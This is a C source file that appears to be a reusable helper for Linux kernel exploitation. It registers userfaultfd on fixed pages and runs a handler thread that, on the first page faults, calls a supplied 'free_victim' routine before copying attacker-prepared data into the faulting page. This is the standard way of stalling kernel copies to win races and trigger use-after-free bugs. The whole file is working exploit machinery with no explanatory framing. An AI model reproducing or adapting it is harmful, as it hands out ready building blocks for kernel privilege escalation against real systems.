#include "userfault.h"

#define DEBUG

#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)

#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)

#define logErr(msg, ...) dprintf(STDERR_FILENO, "[-] " msg "\n", ##__VA_ARGS__)

#define errExit(msg, ...)                                      \
    do                                                         \
    {                                                          \
        dprintf(STDERR_FILENO, "[-] " msg " ", ##__VA_ARGS__); \
        perror("");                                            \
        exit(-1);                                              \
    } while (0)

#define WAIT()                                        \
    do                                                \
    {                                                 \
        write(STDERR_FILENO, "[WAITTING ...]\n", 16); \
        getchar();                                    \
    } while (0)

#else

#define logOK(...) \
    do             \
    {              \
    } while (0)
#define logInfo(...) \
    do               \
    {                \
    } while (0)
#define logErr(...) \
    do              \
    {               \
    } while (0)
#define errExit(...) \
    do               \
    {                \
    } while (0)

#endif

#define userfaultfd(flags) syscall(SYS_userfaultfd, flags)

static void inline set_page_ro(uintptr_t page)
{
    mprotect((void *)page, PAGE_SIZE, PROT_READ);
}

static void inline set_page_rw(uintptr_t page)
{
    mprotect((void *)page, PAGE_SIZE, PROT_READ | PROT_WRITE);
}

char uf_buffer[PAGE_SIZE * 2];
struct userfault_arg userfaultArg;

void static pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        errExit("sched_setaffinity");
    }
}

int register_ufd(uint64_t page, uint numPages)
{
    int fd = 0;
    char *uf_page = (void *)page;
    struct uffdio_api api = {.api = UFFD_API};
    const size_t length = numPages * PAGE_SIZE;

    uf_page = mmap((void *)uf_page, length, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (uf_page == MAP_FAILED)
    {
        perror("mmap uf_page");
        exit(2);
    }

    // setup_uffd:

    if ((fd = userfaultfd(O_NONBLOCK)) == -1)
    {
        errExit("userfaultfd failed");
    }

    if (ioctl(fd, UFFDIO_API, &api))
    {
        errExit("ioctl(fd, UFFDIO_API, ...) failed");
    }
    if (api.api != UFFD_API)
    {
        errExit("unexepcted UFFD api version.");
    }

    /* mmap some pages, set them up with the userfaultfd. */
    struct uffdio_register reg = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = (uint64_t)uf_page,
            .len = length}};

    if (ioctl(fd, UFFDIO_REGISTER, &reg) == -1)
    {
        errExit("ioctl(fd, UFFDIO_REGISTER, ...) failed");
    }

    logInfo("%d", fd);
    return fd;
}

void set_page_wp(uintptr_t page, bool protected)
{
    struct uffdio_writeprotect wp = {.mode = 0};
    logInfo("WP protect page %p", (void *)page);
    wp.range.start = page;
    wp.range.len = PAGE_SIZE;

    if (protected)
    {
        wp.mode = UFFDIO_WRITEPROTECT_MODE_WP;
    }

    if (ioctl(userfaultArg.ufd, UFFDIO_WRITEPROTECT, &wp) == -1)
    {
        logErr("ioctl(UFFDIO_WRITEPROTECT)");
        exit(EXIT_FAILURE);
    }
}

void *userfaultHandler(void *arg_)
{
    struct userfault_arg *arg = (struct userfault_arg *)arg_;

    uint numPages = arg->numPages;
    uintptr_t uf_page = arg->uf_page;
    struct uffdio_copy uffdio_copy_var;

    struct pollfd evt = {.fd = arg->ufd, .events = POLLIN};

    while (poll(&evt, 1, -1) > 0)
    {
        /* unexpected poll events */
        if (evt.revents & POLLERR)
        {
            perror("poll");
            exit(-1);
        }
        else if (evt.revents & POLLHUP)
        {
            perror("pollhup");
            exit(-1);
        }
        struct uffd_msg fault_msg = {0};
        if (read(arg->ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
        {
            perror("read");
            exit(-1);
        }
        uintptr_t place = fault_msg.arg.pagefault.address;
        if (fault_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            logErr("Unexpected uffd event!");
            exit(-1);
        }

        if (place < uf_page || place > uf_page + PAGE_SIZE * numPages)
        {
            logErr("Unexpected pagefault address %p", (void *)place);
            exit(-1);
        }

        ++userfaultArg.faultCount;

        // if (userfaultArg.faultCount >= 5)
        // {
        //     break;
        // }

        logInfo("faultCount = %u", userfaultArg.faultCount);
        logInfo("Page fault at address %p", (void *)place);
        switch (userfaultArg.faultCount)
        {
        case 1:
        case 2:
            arg->free_victim();
            // Stop polling
            uffdio_copy_var.src = uf_buffer; // Copy buf_ to page fault
            uffdio_copy_var.dst = place & ~(PAGE_SIZE - 1);
            uffdio_copy_var.len = PAGE_SIZE;
            uffdio_copy_var.mode = 0;
            if (ioctl(arg->ufd, UFFDIO_COPY, &uffdio_copy_var) == -1)
                errExit("ioctl-UFFDIO_COPY");
            break;

        default:
            break;
        }
    }

    // exit_thread:

    logInfo("Exitting userfaultHandler ...");

    close(arg->ufd);

    return NULL;
}

pthread_t createThreadUserFault(uint64_t page, uint numPages, void (*free_victim)(void))
{
    userfaultArg.uf_page = page;
    userfaultArg.numPages = numPages;
    userfaultArg.ufd = register_ufd(page, numPages);
    userfaultArg.free_victim = free_victim;
    userfaultArg.faultCount = 0;
    pthread_t th;
    pthread_create(&th, NULL, userfaultHandler, &userfaultArg);
    return th;
}